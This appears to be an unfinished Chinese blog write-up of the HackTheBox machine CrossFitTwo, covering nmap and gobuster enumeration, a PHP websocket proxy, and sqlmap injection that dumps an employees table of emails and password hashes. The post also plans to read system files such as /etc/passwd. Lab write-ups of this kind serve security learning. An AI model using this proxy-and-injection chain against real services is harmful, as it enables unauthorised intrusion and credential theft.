@@ -1,0 +1,1400 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>CrossFitTwo - Hackthebox - 还没做完 | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - CrossFitTwo未完成靶场信息  靶场类型  信息搜集首先使用nmap进行信息搜集 ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.232 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-28 20:35 CST WARNING:">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CrossFitTwo - Hackthebox - 还没做完">
+<meta property="og:url" content="http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - CrossFitTwo未完成靶场信息  靶场类型  信息搜集首先使用nmap进行信息搜集 ┌──(root💀root)-[~&#x2F;Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.232 Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-07-28 20:35 CST WARNING:">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/0abbf8b1-25d8-407e-be87-a3eeb69757c1.png">
+<meta property="article:published_time" content="2023-05-19T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-06-13T03:42:27.130Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/0abbf8b1-25d8-407e-be87-a3eeb69757c1.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">CrossFitTwo - Hackthebox - 还没做完</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">CrossFitTwo - Hackthebox - 还没做完</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2023-05-19T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2023-05-19
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-CrossFitTwo未完成"><span class="post-toc-text">Hackthebox - CrossFitTwo未完成</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-text">信息搜集</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-text">漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#x2F-etc-x2F-passwd"><span class="post-toc-text">&#x2F;etc&#x2F;passwd</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#x2F-etc-x2F-login-conf"><span class="post-toc-text">&#x2F;etc&#x2F;login.conf</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#x2F-etc-x2F-ssh-x2F-sshd-config"><span class="post-toc-text">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#x2F-etc-x2F-httpd-conf"><span class="post-toc-text">&#x2F;etc&#x2F;httpd.conf</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#x2F-etc-x2F-relayd-conf"><span class="post-toc-text">&#x2F;etc&#x2F;relayd.conf</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#x2F-var-x2F-unbound-x2F-etc-x2F-unbound-conf"><span class="post-toc-text">&#x2F;var&#x2F;unbound&#x2F;etc&#x2F;unbound.conf</span></a></li></ol></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox/Insane/Hackthebox-CrossFitTwo未完成"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">CrossFitTwo - Hackthebox - 还没做完</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2023-05-19 19:38:36" datetime="2023-05-19T11:38:36.000Z"  itemprop="datePublished">2023-05-19</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-CrossFitTwo未完成"><a href="#Hackthebox-CrossFitTwo未完成" class="headerlink" title="Hackthebox - CrossFitTwo未完成"></a>Hackthebox - CrossFitTwo未完成</h1><h2 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h2>
+
+<h2 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h2><img src="/2023/05/19/Hackthebox/Insane/Hackthebox-CrossFitTwo%E6%9C%AA%E5%AE%8C%E6%88%90/0abbf8b1-25d8-407e-be87-a3eeb69757c1.png" class>
+
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>首先使用nmap进行信息搜集</p>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# nmap -A -sS -sC -sV -p- 10.10.10.232
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-28 20:35 CST
+WARNING: Service 10.10.10.232:80 had already soft-matched http, but now soft-matched rtsp; ignoring second value
+Nmap scan report for 10.10.10.232
+Host is up (0.24s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE             VERSION
+22/tcp   open  ssh                 OpenSSH 8.4 (protocol 2.0)
+| ssh-hostkey:
+|   3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA)
+|   256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)
+|_  256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)
+80/tcp   open  http                (PHP 7.4.12)
+| fingerprint-strings:
+|   GetRequest, HTTPOptions:
+|     HTTP/1.0 200 OK
+|     Connection: close
+|     Connection: close
+|     Content-type: text/html; charset=UTF-8
+|     Date: Wed, 28 Jul 2021 13:03:17 GMT
+|     Server: OpenBSD httpd
+|     X-Powered-By: PHP/7.4.12
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang=&quot;zxx&quot;&gt;
+|     &lt;head&gt;
+|     &lt;meta charset=&quot;UTF-8&quot;&gt;
+|     &lt;meta name=&quot;description&quot; content=&quot;Yoga StudioCrossFit&quot;&gt;
+|     &lt;meta name=&quot;keywords&quot; content=&quot;Yoga, unica, creative, html&quot;&gt;
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
+|     &lt;title&gt;CrossFit&lt;/title&gt;
+|     &lt;!-- Google Font --&gt;
+|     &lt;link href=&quot;https://fonts.googleapis.com/css?family=PT+Sans:400,700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+|     &lt;link href=&quot;https://fonts.googleapis.com/css?family=Oswald:400,500,600,700&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;
+|     &lt;!-- Css Styles --&gt;
+|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot; type=&quot;text/css&quot;&gt;
+|_    &lt;link rel=&quot;styleshe
+|_http-server-header: OpenBSD httpd
+|_http-title: CrossFit
+8953/tcp open  ssl/ub-dns-control?
+| ssl-cert: Subject: commonName=unbound
+| Not valid before: 2021-01-11T07:01:10
+|_Not valid after:  2040-09-28T07:01:10
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.91%I=7%D=7/28%Time=610152AC%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,3541,&quot;HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nConnecti
+SF:on:\x20close\r\nContent-type:\x20text/html;\x20charset=UTF-8\r\nDate:\x
+SF:20Wed,\x2028\x20Jul\x202021\x2013:03:17\x20GMT\r\nServer:\x20OpenBSD\x2
+SF:0httpd\r\nX-Powered-By:\x20PHP/7\.4\.12\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;htm
+SF:l\x20lang=\&quot;zxx\&quot;&gt;\n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;UTF-8\
+SF:&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;description\&quot;\x20content=\&quot;Yoga\x20
+SF:StudioCrossFit\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;keywords\&quot;\x20conten
+SF:t=\&quot;Yoga,\x20unica,\x20creative,\x20html\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20n
+SF:ame=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=1\.0
+SF:\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20content
+SF:=\&quot;ie=edge\&quot;&gt;\n\x20\x20\x20\x20&lt;title&gt;CrossFit&lt;/title&gt;\n\n\x20\x20\x20\
+SF:x20&lt;!--\x20Google\x20Font\x20--&gt;\n\x20\x20\x20\x20&lt;link\x20href=\&quot;https
+SF:://fonts\.googleapis\.com/css\?family=PT\+Sans:400,700&amp;display=swap\&quot;\x
+SF:20rel=\&quot;stylesheet\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20href=\&quot;https://fonts\.g
+SF:oogleapis\.com/css\?family=Oswald:400,500,600,700&amp;display=swap\&quot;\x20rel
+SF:=\&quot;stylesheet\&quot;&gt;\n\n\x20\x20\x20\x20&lt;!--\x20Css\x20Styles\x20--&gt;\n\x20\
+SF:x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/bootstrap\.min\.cs
+SF:s\&quot;\x20type=\&quot;text/css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;styleshe&quot;)%r(
+SF:HTTPOptions,1AFC,&quot;HTTP/1\.0\x20200\x20OK\r\nConnection:\x20close\r\nCon
+SF:nection:\x20close\r\nContent-type:\x20text/html;\x20charset=UTF-8\r\nDa
+SF:te:\x20Wed,\x2028\x20Jul\x202021\x2013:03:17\x20GMT\r\nServer:\x20OpenB
+SF:SD\x20httpd\r\nX-Powered-By:\x20PHP/7\.4\.12\r\n\r\n&lt;!DOCTYPE\x20html&gt;\
+SF:n&lt;html\x20lang=\&quot;zxx\&quot;&gt;\n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;U
+SF:TF-8\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;description\&quot;\x20content=\&quot;Yog
+SF:a\x20StudioCrossFit\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20name=\&quot;keywords\&quot;\x20c
+SF:ontent=\&quot;Yoga,\x20unica,\x20creative,\x20html\&quot;&gt;\n\x20\x20\x20\x20&lt;meta
+SF:\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale
+SF:=1\.0\&quot;&gt;\n\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20co
+SF:ntent=\&quot;ie=edge\&quot;&gt;\n\x20\x20\x20\x20&lt;title&gt;CrossFit&lt;/title&gt;\n\n\x20\x20
+SF:\x20\x20&lt;!--\x20Google\x20Font\x20--&gt;\n\x20\x20\x20\x20&lt;link\x20href=\&quot;
+SF:https://fonts\.googleapis\.com/css\?family=PT\+Sans:400,700&amp;display=swa
+SF:p\&quot;\x20rel=\&quot;stylesheet\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20href=\&quot;https://fon
+SF:ts\.googleapis\.com/css\?family=Oswald:400,500,600,700&amp;display=swap\&quot;\x
+SF:20rel=\&quot;stylesheet\&quot;&gt;\n\n\x20\x20\x20\x20&lt;!--\x20Css\x20Styles\x20--&gt;\n
+SF:\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/bootstrap\.mi
+SF:n\.css\&quot;\x20type=\&quot;text/css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;styleshe
+SF:&quot;);
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=7/28%OT=22%CT=1%CU=43404%PV=Y%DS=2%DC=T%G=Y%TM=610152E
+OS:6%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=RD%CI=RI%II=RI%TS=22
+OS:)OPS(O1=M54DNNSNW6NNT11%O2=M54DNNSNW6NNT11%O3=M54DNW6NNT11%O4=M54DNNSNW6
+OS:NNT11%O5=M54DNNSNW6NNT11%O6=M54DNNSNNT11)WIN(W1=4000%W2=4000%W3=4000%W4=
+OS:4000%W5=4000%W6=4000)ECN(R=Y%DF=Y%T=40%W=4000%O=M54DNNSNW6%CC=N%Q=)T1(R=
+OS:Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A
+OS:%A=S%F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=
+OS:Y%DF=Y%T=40%W=0%S=A%A=S%F=AR%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=FF%IPL=38%U
+OS:N=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=FF%CD=S)
+
+Network Distance: 2 hops
+
+TRACEROUTE (using port 3306/tcp)
+HOP RTT       ADDRESS
+1   237.08 ms 10.10.14.1
+2   237.15 ms 10.10.10.232
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 989.11 seconds
+</code></pre>
+<p>从上面的扫描结果咱们可以得到的线索有 - 本台靶机开启了<code>22</code>，<code>80</code>，<code>8953</code>端口 - 80端口为http服务 - 8953为ssl服务</p>
+<p>咱们先进80端口看看</p>
+
+
+<p>咱们先进行目录路径fuzz吧</p>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# gobuster dir -u http://10.10.10.232 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -b 403,404
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.232
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,txt
+[+] Timeout:                 10s
+===============================================================
+2021/07/28 21:27:27 Starting gobuster in directory enumeration mode
+===============================================================
+/about-us.php         (Status: 200) [Size: 15733]
+/blog.php             (Status: 200) [Size: 15369]
+/classes.php          (Status: 200) [Size: 25946]
+/contact.php          (Status: 200) [Size: 8007]
+/css                  (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/css/]
+/elements.php         (Status: 200) [Size: 19654]
+/fonts                (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/fonts/]
+/images               (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/images/]
+/img                  (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/img/]
+/index.php            (Status: 200) [Size: 19041]
+/index.php            (Status: 200) [Size: 19041]
+/js                   (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/js/]
+/main.html            (Status: 200) [Size: 931]
+/readme.txt           (Status: 200) [Size: 410]
+/vendor               (Status: 301) [Size: 510] [--&gt; http://10.10.10.232/vendor/]
+
+===============================================================
+2021/07/28 21:38:26 Finished
+===============================================================
+</code></pre>
+<p>扫描的同时，在80端口手动收集了一下信息。点击<code>MEMBER AREA</code>会跳转到一个域名<code>employees.crossfit.htb</code>，但咱们本地没有添加解析，所以我们给它添加上</p>
+<pre><code class="Plain">echo 10.10.10.232 crossfit.htb employees.crossfit.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>然后就可以访问这个域名了</p>
+
+
+<p>访问后发现是一个登录页面，手动测试了几个弱口令没有成功，咱们依然挂上目录fuzz然后去进行其他的搜集</p>
+<pre><code class="Plain">┌──(root💀root)-[~/Desktop]
+└─# gobuster dir -u http://employees.crossfit.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html,txt -t 100 -b 403,404
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://employees.crossfit.htb/
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              php,html,txt
+[+] Timeout:                 10s
+===============================================================
+2021/07/28 21:03:34 Starting gobuster in directory enumeration mode
+===============================================================
+/css                  (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/css/]
+/index.php            (Status: 200) [Size: 4412]
+/index.php            (Status: 200) [Size: 4412]
+/js                   (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/js/]
+/vendor               (Status: 301) [Size: 510] [--&gt; http://employees.crossfit.htb/vendor/]
+
+===============================================================
+2021/07/28 21:04:42 Finished
+===============================================================
+</code></pre>
+
+
+<p>查看主页的流量，还可以看到一个域名</p>
+<pre><code class="Plain">gym.crossfit.htb
+</code></pre>
+<p>的</p>
+<pre><code class="Plain">websocket
+</code></pre>
+<p>，咱们也加入到hosts里</p>
+<pre><code class="Plain">echo 10.10.10.232 gym.crossfit.htb &gt;&gt; /etc/hosts
+</code></pre>
+<p>该条信息所在的js文件</p>
+<pre><code class="Plain">http://10.10.10.232/js/ws.min.js
+
+function updateScroll() {
+  var e = document.getElementById(&#39;chats&#39;);
+  e.scrollTop = e.scrollHeight
+}
+var token,
+ws = new WebSocket(&#39;ws://gym.crossfit.htb/ws/&#39;),
+pingTimeout = setTimeout(() =&gt;{
+  ws.close(),
+  $(&#39;.chat-main&#39;).remove()
+}, 31000);
+function check_availability(e) {
+  var s = new Object;
+  s.message = &#39;available&#39;,
+  s.params = String(e),
+  s.token = token,
+  ws.send(JSON.stringify(s))
+}
+$(&#39;.chat-content&#39;).slideUp(),
+$(&#39;.hide-chat-box&#39;).click(function () {
+  $(&#39;.chat-content&#39;).slideUp()
+}),
+$(&#39;.show-chat-box&#39;).click(function () {
+  $(&#39;.chat-content&#39;).slideDown(),
+  updateScroll()
+}),
+$(&#39;.close-chat-box&#39;).click(function () {
+  $(&#39;.chat-main&#39;).remove()
+}),
+ws.onopen = function () {
+},
+ws.onmessage = function (e) {
+  &#39;ping&#39; === e.data ? (ws.send(&#39;pong&#39;), clearTimeout(pingTimeout)) : (response = JSON.parse(e.data), answer = response.message, answer.startsWith(&#39;Hello!&#39;) &amp;&amp; $(&#39;#ws&#39;).show(), token = response.token, $(&#39;#chat-messages&#39;).append(&#39;&lt;li class=&quot;receive-msg float-left mb-2&quot;&gt;&lt;div class=&quot;receive-msg-desc float-left ml-2&quot;&gt;&lt;p class=&quot;msg_display bg-white m-0 pt-1 pb-1 pl-2 pr-2 rounded&quot;&gt;&#39; + answer + &#39;&lt;/p&gt;&lt;/div&gt;&lt;/li&gt;&#39;), updateScroll())
+},
+$(&#39;#sendmsg&#39;).on(&#39;keypress&#39;, function (e) {
+  if (13 === e.which) {
+    $(this).attr(&#39;disabled&#39;, &#39;disabled&#39;);
+    var s = $(&#39;#sendmsg&#39;).val();
+    if (&#39;&#39; !== s) {
+      $(&#39;#chat-messages&#39;).append(&#39;&lt;li class=&quot;send-msg float-right mb-2&quot;&gt;&lt;p class=&quot;msg_display pt-1 pb-1 pl-2 pr-2 m-0 rounded&quot;&gt;&#39; + s + &#39;&lt;/p&gt;&lt;/li&gt;&#39;);
+      var t = new Object;
+      t.message = s,
+      t.token = token,
+      ws.send(JSON.stringify(t)),
+      $(&#39;#sendmsg&#39;).val(&#39;&#39;),
+      $(this).removeAttr(&#39;disabled&#39;),
+      updateScroll()
+    }
+  }
+});
+</code></pre>
+
+
+<p>添加后再访问主页，会发现右下角多了一个聊天窗，大约30s后会消失</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>测试一下Websockets</p>
+<pre><code class="Plain">python3 -m websockets ws://gym.crossfit.htb/ws/
+
+{&quot;status&quot;:&quot;200&quot;,&quot;message&quot;:&quot;Hello! This is Arnold, your assistant. Type &#39;help&#39; to see available commands.&quot;,&quot;token&quot;:&quot;c7be5b4a23c5c16da958ff6ff7bd2a9ba12870159010824f6018199ece5fd8eb&quot;}
+</code></pre>
+<p>我们会发现，每次请求的tokne值都不一样</p>
+<p>我们自己写一个websocket-client &gt; 参考连接 <a href="https://amphp.org/websocket-client/" target="_blank" rel="noopener">https://amphp.org/websocket-client/</a></p>
+<pre><code class="Plain">websocket-client.php
+
+&lt;?php
+
+require &#39;vendor/autoload.php&#39;;
+
+use Amp\Websocket\Client;
+
+Amp\Loop::run(function () {
+    $connection = yield Client\connect(&#39;ws://gym.crossfit.htb/ws/&#39;);
+    $message = yield $connection-&gt;receive();
+    $payload = yield $message-&gt;buffer();
+    $token   = json_decode($payload, true)[&quot;token&quot;];
+    $check   = json_encode(array(&#39;message&#39; =&gt; &#39;available&#39;, &#39;params&#39; =&gt; $_GET[&#39;id&#39;], &#39;token&#39; =&gt; $token));
+    yield $connection-&gt;send($check);
+    $message = yield $connection-&gt;receive();
+    $payload = yield $message-&gt;buffer();
+    header(&quot;Content-Type: application/json&quot;);
+    printf($payload);
+
+    $connection-&gt;close();
+});
+</code></pre>
+<pre><code class="Plain">composer require amphp/websocket-client
+
+php -S 0.0.0.0:1234
+</code></pre>
+<p>开启以后，使用curl获取一下我们的websocket-client.php文件的内容看看</p>
+<pre><code class="Plain">curl http://127.0.0.1:1234/websocket-client.php
+
+┌──(root💀root)-[~/Desktop]
+└─# curl http://127.0.0.1:1234/websocket-client.php
+{&quot;status&quot;:&quot;200&quot;,&quot;message&quot;:&quot;I&#39;m sorry, this membership plan is currently unavailable.&quot;,&quot;token&quot;:&quot;69fc8199b15d3b5b2cbdc79c85d1173d9907a85d0f711348c4bd0273338a3e92&quot;,&quot;debug&quot;:&quot;[id: null]&quot;}
+</code></pre>
+<p>提示<code>id:null</code>，那咱们就给它加一个<code>id</code>参数</p>
+<pre><code class="Plain">curl http://127.0.0.1:1234/websocket-client.php?id=1
+
+┌──(root💀root)-[~/Desktop]
+└─# curl http://127.0.0.1:1234/websocket-client.php?id=1
+{&quot;status&quot;:&quot;200&quot;,&quot;message&quot;:&quot;Good news! This membership plan is available.&quot;,&quot;token&quot;:&quot;21968a22a2766f17daf66508929fcb0a0cd333bef79064b0cd90b10c165e096d&quot;,&quot;debug&quot;:&quot;[id: 1, name: 1-month]&quot;}
+</code></pre>
+<p>OK，这次有参数了，那看到这里大家能想到什么呢？反正我想到了注入，说干就干</p>
+<pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --dbs
+
+[14:38:53] [INFO] fetching database names
+available databases [1]:
+[*] information_schema
+</code></pre>
+<p>OK，确定是可以注入的了，咱们一步步注入下去</p>
+<pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 --dbs
+
+available databases [3]:
+[*] crossfit
+[*] employees
+[*] information_schema
+</code></pre>
+<pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 -D employees --tables
+
+Database: employees
+[2 tables]
++----------------+
+| employees      |
+| password_reset |
++----------------+
+</code></pre>
+<pre><code class="Plain">sqlmap -u http://127.0.0.1:1234/websocket-client.php?id=1 --batch --technique=B --threads=10 -D employees -T employees --dump
+
+Database: employees
+Table: employees
+[4 entries]
++----+-----------------------------+------------------------------------------------------------------+---------------+
+| id | email                       | password                                                         | username      |
++----+-----------------------------+------------------------------------------------------------------+---------------+
+| 1  | david.palmer@crossfit.htb   | fff34363f4d15e958f0fb9a7c2e7cc550a5672321d54b5712cd6e4fa17cd2ac8 | administrator |
+| 2  | will.smith@crossfit.htb     | 06b4daca29092671e44ef8fad8ee38783b4294d9305853027d1b48029eac0683 | wsmith        |
+| 3  | maria.williams@crossfit.htb | fe46198cb29909e5dd9f61af986ca8d6b4b875337261bdaa5204f29582462a9c | mwilliams     |
+| 4  | jack.parker@crossfit.htb    | 4de9923aba6554d148dbcd3369ff7c6e71841286e5106a69e250f779770b3648 | jparker       |
++----+-----------------------------+------------------------------------------------------------------+---------------+
+</code></pre>
+<p>测试了一下，无法解密出来，让我们换个思路</p>
+<p>让我们使用sql注入读取一下文件试试 &gt; OpenBSD相关配置文件</p>
+<blockquote>
+<p><a href="https://man.openbsd.org/?query=config&amp;apropos=1&amp;sec=5&amp;arch=default&amp;manpath=OpenBSD-current" target="_blank" rel="noopener">https://man.openbsd.org/?query=config&amp;apropos=1&amp;sec=5&amp;arch=default&amp;manpath=OpenBSD-current</a></p>
+</blockquote>
